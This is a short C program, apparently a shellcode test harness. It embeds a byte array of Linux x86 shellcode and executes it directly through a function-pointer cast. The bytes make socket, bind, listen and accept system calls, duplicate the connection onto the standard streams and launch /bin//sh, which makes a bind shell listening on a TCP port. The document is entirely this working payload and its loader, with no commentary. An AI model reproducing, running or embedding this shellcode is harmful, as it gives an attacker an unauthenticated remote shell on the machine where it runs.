#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x40\x50\x5b\x50\x40\x50\xb0\x66\x89\xe1\xcd\x80\x89\xc7\x5b\x58\x66\xb8\x30\x39\x66\x50\x66\x53\x89\xe1\x31\xc0\xb0\x10\x50\x51\x57\xb0\x66\x89\xe1\xcd\x80\x50\x57\xb0\x66\xb3\x04\x89\xe1\xcd\x80\xb0\x66\x43\xcd\x80\x93\x31\xc9\xb1\x03\xb0\x3f\x49\xcd\x80\x75\xf9\xd6\x89\xc1\x89\xc2\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	